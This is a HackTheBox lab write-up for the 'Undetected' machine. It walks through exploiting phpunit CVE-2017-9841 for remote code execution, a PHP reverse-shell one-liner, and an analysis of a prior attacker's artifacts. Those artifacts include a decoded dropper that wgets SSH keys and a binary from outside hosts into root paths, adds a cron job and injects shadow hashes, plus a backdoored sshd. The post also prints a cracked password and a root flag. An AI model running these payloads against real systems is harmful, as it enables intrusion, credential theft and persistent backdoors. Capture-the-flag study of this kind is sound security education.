---
title: Undetected writeup
date: 2022-07-17 15:00:00 +0200
categories: [Writeup, HackTheBox]
tags: ["medium-box", "reversing", "php"]     # TAG names should always be lowercase
img_path: /assets/img/boxes/undetected/
image: # Thumbnail 
  src: Undetected.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Summary
This is a box that focuses on reversing a lot of files from a previous attacker who has been so kind as to leave his backdoors in place for us. Let's take a look!
## Foothold
We start out by doing an nmap port scan:

```console
# Nmap 7.92 scan initiated Sat Mar  5 16:44:36 2022 as: nmap -sC -sV -p- -o nmap/full.txt 10.129.151.107
Nmap scan report for 10.129.151.107
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  5 16:44:53 2022 -- 1 IP address (1 host up) scanned in 17.44 seconds
```
We can start out by checking out port 80:

![](welcome.png)

It seems to be a jewelry store. If we add djewelry.htb to our host file and scan for vhosts we dont seem to find anything interesting. If we instead fuzz for directories we find a `/vendor` directory:
```console
┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]
└─$ gobuster dir -u http://store.djewelry.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt                                                                                                               2 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.djewelry.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/17 17:35:27 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 283]
/.html                (Status: 403) [Size: 283]
/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]    
/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]   
/.htm                 (Status: 403) [Size: 283]                                        
/.                    (Status: 200) [Size: 6215]                                       
/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/] 
/.htaccess            (Status: 403) [Size: 283]                                        
/.phtml               (Status: 403) [Size: 283]                                        
/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]
/.htc                 (Status: 403) [Size: 283]                                        
/.html_var_DE         (Status: 403) [Size: 283]                                        
/server-status        (Status: 403) [Size: 283]                                        
/.htpasswd            (Status: 403) [Size: 283]                                        
/.html.               (Status: 403) [Size: 283]                                        
/.html.html           (Status: 403) [Size: 283]                                        
/.htpasswds           (Status: 403) [Size: 283]                                        
/.htm.                (Status: 403) [Size: 283]                                        
/.htmll               (Status: 403) [Size: 283]                                        
/.phps                (Status: 403) [Size: 283]                                        
/.html.old            (Status: 403) [Size: 283]                                        
/.ht                  (Status: 403) [Size: 283]                                        
/.html.bak            (Status: 403) [Size: 283]                                        
/.htm.htm             (Status: 403) [Size: 283]                                        
/.hta                 (Status: 403) [Size: 283]                                        
/.html1               (Status: 403) [Size: 283]                                        
/.htgroup             (Status: 403) [Size: 283]                                        
/.html.LCK            (Status: 403) [Size: 283]                                        
/.html.printable      (Status: 403) [Size: 283]                                    
``` 
![](vendor.png)

We find that the web application uses phpunit, and that this version has a [cve](https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md)

We can then go to the endpoint `http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` and achieve RCE:

![](rce.png)

We can then use this to get a reverse shell on the target via the php code `<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.17.182/1337 0>&1"')?>`

```console
──(bitis㉿workstation)-[~/Coding/BitisG.github.io]
└─$ nc -lvnp 4444                         
listening on [any] 4444 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.136.44] 60698
bash: cannot set terminal process group (963): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ 
```

## Pivot

Running linpeas, we find an interesting file named `/var/backups/info`.

We can download this file to our machine, and then run xxd on it.

```console
00003000: 0100 0200 0000 0000 5b2d 5d20 7365 7473  ........[-] sets
00003010: 6f63 6b6f 7074 2850 4143 4b45 545f 5645  ockopt(PACKET_VE
00003020: 5253 494f 4e29 0000 5b2d 5d20 7365 7473  RSION)..[-] sets
00003030: 6f63 6b6f 7074 2850 4143 4b45 545f 5258  ockopt(PACKET_RX
00003040: 5f52 494e 4729 005b 2d5d 2073 6f63 6b65  _RING).[-] socke
00003050: 7428 4146 5f50 4143 4b45 5429 006c 6f00  t(AF_PACKET).lo.
00003060: 5b2d 5d20 6269 6e64 2841 465f 5041 434b  [-] bind(AF_PACK
00003070: 4554 2900 5b2d 5d20 7365 6e64 746f 2853  ET).[-] sendto(S
00003080: 4f43 4b5f 5241 5729 005b 2d5d 2073 6f63  OCK_RAW).[-] soc
00003090: 6b65 7428 534f 434b 5f52 4157 2900 5b2d  ket(SOCK_RAW).[-
000030a0: 5d20 736f 636b 6574 2853 4f43 4b5f 4447  ] socket(SOCK_DG
000030b0: 5241 4d29 0000 0000 5b2d 5d20 6b6c 6f67  RAM)....[-] klog
000030c0: 6374 6c28 5359 534c 4f47 5f41 4354 494f  ctl(SYSLOG_ACTIO
000030d0: 4e5f 5349 5a45 5f42 5546 4645 5229 0000  N_SIZE_BUFFER)..
000030e0: 5b2d 5d20 6b6c 6f67 6374 6c28 5359 534c  [-] klogctl(SYSL
000030f0: 4f47 5f41 4354 494f 4e5f 5245 4144 5f41  OG_ACTION_READ_A
00003100: 4c4c 2900 4672 6565 696e 6720 534d 5000  LL).Freeing SMP.
00003110: 5b2d 5d20 7375 6273 7472 696e 6720 2725  [-] substring '%
00003120: 7327 206e 6f74 2066 6f75 6e64 2069 6e20  s' not found in 
00003130: 646d 6573 670a 0066 6666 6600 2f62 696e  dmesg..ffff./bin
00003140: 2f62 6173 6800 2d63 0000 0000 0000 0000  /bash.-c........
00003150: 3737 3637 3635 3734 3230 3734 3635 3664  776765742074656d
00003160: 3730 3636 3639 3663 3635 3733 3265 3738  7066696c65732e78
00003170: 3739 3761 3266 3631 3735 3734 3638 3666  797a2f617574686f
00003180: 3732 3639 3761 3635 3634 3566 3662 3635  72697a65645f6b65
00003190: 3739 3733 3230 3264 3466 3230 3266 3732  7973202d4f202f72
000031a0: 3666 3666 3734 3266 3265 3733 3733 3638  6f6f742f2e737368
000031b0: 3266 3631 3735 3734 3638 3666 3732 3639  2f617574686f7269
000031c0: 3761 3635 3634 3566 3662 3635 3739 3733  7a65645f6b657973
000031d0: 3362 3230 3737 3637 3635 3734 3230 3734  3b20776765742074
000031e0: 3635 3664 3730 3636 3639 3663 3635 3733  656d7066696c6573
000031f0: 3265 3738 3739 3761 3266 3265 3664 3631  2e78797a2f2e6d61
00003200: 3639 3665 3230 3264 3466 3230 3266 3736  696e202d4f202f76
00003210: 3631 3732 3266 3663 3639 3632 3266 3265  61722f6c69622f2e
00003220: 3664 3631 3639 3665 3362 3230 3633 3638  6d61696e3b206368
00003230: 3664 3666 3634 3230 3337 3335 3335 3230  6d6f642037353520
00003240: 3266 3736 3631 3732 3266 3663 3639 3632  2f7661722f6c6962
00003250: 3266 3265 3664 3631 3639 3665 3362 3230  2f2e6d61696e3b20
00003260: 3635 3633 3638 3666 3230 3232 3261 3230  6563686f20222a20
00003270: 3333 3230 3261 3230 3261 3230 3261 3230  33202a202a202a20
00003280: 3732 3666 3666 3734 3230 3266 3736 3631  726f6f74202f7661
00003290: 3732 3266 3663 3639 3632 3266 3265 3664  722f6c69622f2e6d
000032a0: 3631 3639 3665 3232 3230 3365 3365 3230  61696e22203e3e20
000032b0: 3266 3635 3734 3633 3266 3633 3732 3666  2f6574632f63726f
000032c0: 3665 3734 3631 3632 3362 3230 3631 3737  6e7461623b206177
000032d0: 3662 3230 3264 3436 3232 3361 3232 3230  6b202d46223a2220
000032e0: 3237 3234 3337 3230 3364 3364 3230 3232  272437203d3d2022
000032f0: 3266 3632 3639 3665 3266 3632 3631 3733  2f62696e2f626173
00003300: 3638 3232 3230 3236 3236 3230 3234 3333  6822202626202433
00003310: 3230 3365 3364 3230 3331 3330 3330 3330  203e3d2031303030
00003320: 3230 3762 3733 3739 3733 3734 3635 3664  207b73797374656d
00003330: 3238 3232 3635 3633 3638 3666 3230 3232  28226563686f2022
00003340: 3234 3331 3232 3331 3361 3563 3234 3336  243122313a5c2436
00003350: 3563 3234 3761 3533 3337 3739 3662 3438  5c247a5337796b48
00003360: 3636 3436 3464 3637 3333 3631 3539 3638  66464d6733615968
00003370: 3734 3334 3563 3234 3331 3439 3535 3732  74345c2431495572
00003380: 3638 3561 3631 3665 3532 3735 3434 3561  685a616e5275445a
00003390: 3638 3636 3331 3666 3439 3634 3665 3666  6866316f49646e6f
000033a0: 3466 3736 3538 3666 3666 3663 3462 3664  4f76586f6f6c4b6d
000033b0: 3663 3737 3632 3662 3635 3637 3432 3538  6c77626b65674258
000033c0: 3662 3265 3536 3734 3437 3637 3337 3338  6b2e567447673738
000033d0: 3635 3463 3337 3537 3432 3464 3336 3466  654c3757424d364f
000033e0: 3732 3465 3734 3437 3632 3561 3738 3462  724e7447625a784b
000033f0: 3432 3734 3530 3735 3338 3535 3636 3664  427450753855666d
00003400: 3339 3638 3464 3330 3532 3266 3432 3463  39684d30522f424c
00003410: 3634 3431 3433 3666 3531 3330 3534 3339  6441436f51305439
00003420: 3665 3266 3361 3331 3338 3338 3331 3333  6e2f3a3138383133
00003430: 3361 3330 3361 3339 3339 3339 3339 3339  3a303a3939393939
00003440: 3361 3337 3361 3361 3361 3230 3365 3365  3a373a3a3a203e3e
00003450: 3230 3266 3635 3734 3633 3266 3733 3638  202f6574632f7368
00003460: 3631 3634 3666 3737 3232 3239 3764 3237  61646f7722297d27
00003470: 3230 3266 3635 3734 3633 3266 3730 3631  202f6574632f7061
00003480: 3733 3733 3737 3634 3362 3230 3631 3737  737377643b206177
00003490: 3662 3230 3264 3436 3232 3361 3232 3230  6b202d46223a2220
000034a0: 3237 3234 3337 3230 3364 3364 3230 3232  272437203d3d2022
000034b0: 3266 3632 3639 3665 3266 3632 3631 3733  2f62696e2f626173
000034c0: 3638 3232 3230 3236 3236 3230 3234 3333  6822202626202433
000034d0: 3230 3365 3364 3230 3331 3330 3330 3330  203e3d2031303030
000034e0: 3230 3762 3733 3739 3733 3734 3635 3664  207b73797374656d
000034f0: 3238 3232 3635 3633 3638 3666 3230 3232  28226563686f2022
00003500: 3234 3331 3232 3230 3232 3234 3333 3232  2431222022243322
00003510: 3230 3232 3234 3336 3232 3230 3232 3234  2022243622202224
00003520: 3337 3232 3230 3365 3230 3735 3733 3635  3722203e20757365
00003530: 3732 3733 3265 3734 3738 3734 3232 3239  72732e7478742229
00003540: 3764 3237 3230 3266 3635 3734 3633 3266  7d27202f6574632f
00003550: 3730 3631 3733 3733 3737 3634 3362 3230  7061737377643b20
00003560: 3737 3638 3639 3663 3635 3230 3732 3635  7768696c65207265
00003570: 3631 3634 3230 3264 3732 3230 3735 3733  6164202d72207573
00003580: 3635 3732 3230 3637 3732 3666 3735 3730  65722067726f7570
00003590: 3230 3638 3666 3664 3635 3230 3733 3638  20686f6d65207368
000035a0: 3635 3663 3663 3230 3566 3362 3230 3634  656c6c205f3b2064
000035b0: 3666 3230 3635 3633 3638 3666 3230 3232  6f206563686f2022
000035c0: 3234 3735 3733 3635 3732 3232 3331 3232  2475736572223122
000035d0: 3361 3738 3361 3234 3637 3732 3666 3735  3a783a2467726f75
000035e0: 3730 3361 3234 3637 3732 3666 3735 3730  703a2467726f7570
000035f0: 3361 3263 3263 3263 3361 3234 3638 3666  3a2c2c2c3a24686f
00003600: 3664 3635 3361 3234 3733 3638 3635 3663  6d653a247368656c
00003610: 3663 3232 3230 3365 3365 3230 3266 3635  6c22203e3e202f65
00003620: 3734 3633 3266 3730 3631 3733 3733 3737  74632f7061737377
00003630: 3634 3362 3230 3634 3666 3665 3635 3230  643b20646f6e6520
00003640: 3363 3230 3735 3733 3635 3732 3733 3265  3c2075736572732e
00003650: 3734 3738 3734 3362 3230 3732 3664 3230  7478743b20726d20
00003660: 3735 3733 3635 3732 3733 3265 3734 3738  75736572732e7478
00003670: 3734 3362 005b 2d5d 2066 6f72 6b28 2900  743b.[-] fork().
00003680: 2f65 7463 2f73 6861 646f 7700 5b2e 5d20  /etc/shadow.[.] 
00003690: 6368 6563 6b69 6e67 2069 6620 7765 2067  checking if we g
000036a0: 6f74 2072 6f6f 7400 5b2d 5d20 736f 6d65  ot root.[-] some
000036b0: 7468 696e 6720 7765 6e74 2077 726f 6e67  thing went wrong
000036c0: 203d 2800 5b2b 5d20 676f 7420 7230 3074   =(.[+] got r00t
000036d0: 205e 5f5e 005b 2d5d 2075 6e73 6861 7265   ^_^.[-] unshare
000036e0: 2843 4c4f 4e45 5f4e 4557 5553 4552 2900  (CLONE_NEWUSER).
000036f0: 6465 6e79 002f 7072 6f63 2f73 656c 662f  deny./proc/self/
00003700: 7365 7467 726f 7570 7300 0000 0000 0000  setgroups.......
00003710: 5b2d 5d20 7772 6974 655f 6669 6c65 282f  [-] write_file(/
00003720: 7072 6f63 2f73 656c 662f 7365 745f 6772  proc/self/set_gr
00003730: 6f75 7073 2900 3020 2564 2031 0a00 2f70  oups).0 %d 1../p
00003740: 726f 632f 7365 6c66 2f75 6964 5f6d 6170  roc/self/uid_map
00003750: 0000 0000 0000 0000 5b2d 5d20 7772 6974  ........[-] writ
00003760: 655f 6669 6c65 282f 7072 6f63 2f73 656c  e_file(/proc/sel
00003770: 662f 7569 645f 6d61 7029 002f 7072 6f63  f/uid_map)./proc
00003780: 2f73 656c 662f 6769 645f 6d61 7000 0000  /self/gid_map...
00003790: 5b2d 5d20 7772 6974 655f 6669 6c65 282f  [-] write_file(/
000037a0: 7072 6f63 2f73 656c 662f 6769 645f 6d61  proc/self/gid_ma
000037b0: 7029 005b 2d5d 2073 6368 6564 5f73 6574  p).[-] sched_set
000037c0: 6166 6669 6e69 7479 2829 002f 7362 696e  affinity()./sbin
000037d0: 2f69 6663 6f6e 6669 6720 6c6f 2075 7000  /ifconfig lo up.
000037e0: 5b2d 5d20 7379 7374 656d 282f 7362 696e  [-] system(/sbin
000037f0: 2f69 6663 6f6e 6669 6720 6c6f 2075 7029  /ifconfig lo up)
00003800: 005b 2e5d 2073 7461 7274 696e 6700 5b2e  .[.] starting.[.
00003810: 5d20 6e61 6d65 7370 6163 6520 7361 6e64  ] namespace sand
00003820: 626f 7820 7365 7420 7570 0000 0000 0000  box set up......
00003830: 5b2e 5d20 4b41 534c 5220 6279 7061 7373  [.] KASLR bypass
00003840: 2065 6e61 626c 6564 2c20 6765 7474 696e   enabled, gettin
00003850: 6720 6b65 726e 656c 2061 6464 7200 5b2e  g kernel addr.[.
00003860: 5d20 646f 6e65 2c20 6b65 726e 656c 2074  ] done, kernel t
00003870: 6578 743a 2020 2025 6c78 0a00 5b2e 5d20  ext:   %lx..[.] 
00003880: 636f 6d6d 6974 5f63 7265 6473 3a20 2020  commit_creds:   
00003890: 2020 2020 2025 6c78 0a00 5b2e 5d20 7072       %lx..[.] pr
000038a0: 6570 6172 655f 6b65 726e 656c 5f63 7265  epare_kernel_cre
000038b0: 643a 2025 6c78 0a00 5b2e 5d20 6e61 7469  d: %lx..[.] nati
000038c0: 7665 5f77 7269 7465 5f63 7234 3a20 2020  ve_write_cr4:   
000038d0: 2025 6c78 0a00 5b2e 5d20 7061 6464 696e   %lx..[.] paddin
000038e0: 6720 6865 6170 005b 2e5d 2064 6f6e 652c  g heap.[.] done,
000038f0: 2068 6561 7020 6973 2070 6164 6465 6400   heap is padded.
00003900: 5b2e 5d20 534d 4550 2026 2053 4d41 5020  [.] SMEP & SMAP 
00003910: 6279 7061 7373 2065 6e61 626c 6564 2c20  bypass enabled, 
00003920: 7475 726e 696e 6720 7468 656d 206f 6666  turning them off
00003930: 0000 0000 0000 0000 5b2e 5d20 646f 6e65  ........[.] done
00003940: 2c20 534d 4550 2026 2053 4d41 5020 7368  , SMEP & SMAP sh
00003950: 6f75 6c64 2062 6520 6f66 6620 6e6f 7700  ould be off now.
00003960: 5b2e 5d20 6578 6563 7574 696e 6720 6765  [.] executing ge
00003970: 7420 726f 6f74 2070 6179 6c6f 6164 2025  t root payload %
00003980: 700a 005b 2e5d 2064 6f6e 652c 2073 686f  p..[.] done, sho
00003990: 756c 6420 6265 2072 6f6f 7420 6e6f 7700  uld be root now.
```
It seems to be an exploit. If we import it to cyberchef we can decode the hexcodes in the file:

```console
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.tx
```
We can crack the hash with john to be `ihatehackers`. We can then login as the user `steven1` with this password.

## Privilege escalation
If we enter the `/etc/apache2/mods-enabled/` directory, we find a file that has been modified at a much different date than the rest:

```console
steven@production:/etc/apache2/mods-enabled$ ls -al
total 8
drwxr-xr-x 2 root root 4096 Feb  8 19:59 .
drwxr-xr-x 8 root root 4096 Feb  8 19:59 ..
lrwxrwxrwx 1 root root   36 Jul  4  2021 access_compat.load -> ../mods-available/access_compat.load
lrwxrwxrwx 1 root root   28 Jul  4  2021 alias.conf -> ../mods-available/alias.conf
lrwxrwxrwx 1 root root   28 Jul  4  2021 alias.load -> ../mods-available/alias.load
lrwxrwxrwx 1 root root   33 Jul  4  2021 auth_basic.load -> ../mods-available/auth_basic.load
lrwxrwxrwx 1 root root   33 Jul  4  2021 authn_core.load -> ../mods-available/authn_core.load
lrwxrwxrwx 1 root root   33 Jul  4  2021 authn_file.load -> ../mods-available/authn_file.load
lrwxrwxrwx 1 root root   33 Jul  4  2021 authz_core.load -> ../mods-available/authz_core.load
lrwxrwxrwx 1 root root   33 Jul  4  2021 authz_host.load -> ../mods-available/authz_host.load
lrwxrwxrwx 1 root root   33 Jul  4  2021 authz_user.load -> ../mods-available/authz_user.load
lrwxrwxrwx 1 root root   32 Jul  5  2021 autoindex.conf -> ../mods-available/autoindex.conf
lrwxrwxrwx 1 root root   32 Jul  5  2021 autoindex.load -> ../mods-available/autoindex.load
lrwxrwxrwx 1 root root   30 Jul  4  2021 deflate.conf -> ../mods-available/deflate.conf
lrwxrwxrwx 1 root root   30 Jul  4  2021 deflate.load -> ../mods-available/deflate.load
lrwxrwxrwx 1 root root   26 Jul  4  2021 dir.conf -> ../mods-available/dir.conf
lrwxrwxrwx 1 root root   26 Jul  4  2021 dir.load -> ../mods-available/dir.load
lrwxrwxrwx 1 root root   26 Jul  4  2021 env.load -> ../mods-available/env.load
lrwxrwxrwx 1 root root   29 Jul  4  2021 filter.load -> ../mods-available/filter.load
lrwxrwxrwx 1 root root   27 Jul  4  2021 mime.conf -> ../mods-available/mime.conf
lrwxrwxrwx 1 root root   27 Jul  4  2021 mime.load -> ../mods-available/mime.load
lrwxrwxrwx 1 root root   34 Jul  4  2021 mpm_prefork.conf -> ../mods-available/mpm_prefork.conf
lrwxrwxrwx 1 root root   34 Jul  4  2021 mpm_prefork.load -> ../mods-available/mpm_prefork.load
lrwxrwxrwx 1 root root   34 Jul  4  2021 negotiation.conf -> ../mods-available/negotiation.conf
lrwxrwxrwx 1 root root   34 Jul  4  2021 negotiation.load -> ../mods-available/negotiation.load
lrwxrwxrwx 1 root root   29 Jul  4  2021 php7.4.conf -> ../mods-available/php7.4.conf
lrwxrwxrwx 1 root root   29 Jul  4  2021 php7.4.load -> ../mods-available/php7.4.load
lrwxrwxrwx 1 root root   29 May 17  2021 reader.load -> ../mods-available/reader.load
lrwxrwxrwx 1 root root   33 Jul  4  2021 reqtimeout.conf -> ../mods-available/reqtimeout.conf
lrwxrwxrwx 1 root root   33 Jul  4  2021 reqtimeout.load -> ../mods-available/reqtimeout.load
lrwxrwxrwx 1 root root   31 Jul  4  2021 setenvif.conf -> ../mods-available/setenvif.conf
lrwxrwxrwx 1 root root   31 Jul  4  2021 setenvif.load -> ../mods-available/setenvif.load
lrwxrwxrwx 1 root root   29 Jul  4  2021 status.conf -> ../mods-available/status.conf
lrwxrwxrwx 1 root root   29 Jul  4  2021 status.load -> ../mods-available/status.load
```
Às we can see, `read.load` was modified on May 17, while the rest was modified July 4th. If we check out the file it is symlinked to, we find out the mod is actually loading the file `/usr/lib/apache2/modules/mod_reader.so`. 

We can then download this file to our machine.

analyzing the file with ghidra, we find a suspicious function with a base64 encoded string. 

![](ghidra.png)

Decoding this string results in:

```console
┌──(bitis㉿workstation)-[~/htb/Machines/undetected]
└─$ echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0 ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `datbase64: invalid input
```
It seems that the attacker has replaced the `sshd` file in `/usr/sbin`. WE can also download this file an analyze it in ghidra:

![](ghidra2.png)

If we take a look at the `auth_password` function it seems that there is a variable named backdoor. 

![](ghidra3.png)

We can see what bytes are contained in the backdoor variable. WE acn also see that each of these bytes are XORed with `0x96`, before being compared with the password variable. We can decode the bakcdoor with cyberchef:

![](cyber.png)

We can then login as root with this password:

```console
┌──(bitis㉿workstation)-[~/htb/Machines/undetected]
└─$ ssh root@djewelry.htb    
root@djewelry.htb's password: 
Last login: Sun Feb 20 15:29:35 2022
root@production:~# cat root.txt 
8aa6c3df270f6cf60f1126e8d3ec3036
root@production:~# 
```
Rooted!